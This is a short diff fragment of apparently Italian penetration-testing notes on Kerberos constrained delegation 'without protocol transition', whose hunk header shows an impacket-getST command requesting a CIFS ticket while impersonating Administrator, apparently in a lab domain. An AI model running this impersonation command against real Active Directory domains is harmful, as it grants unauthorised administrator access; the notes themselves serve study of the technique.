@@ -33,3 +33,4 @@ impacket-getST -spn 'CIFS/winterfell' -impersonate Administrator -dc-ip '192.168
 ```
 ![[Pasted image 20230911111655.png]]
 *Senza protocol transition*
+Per exp
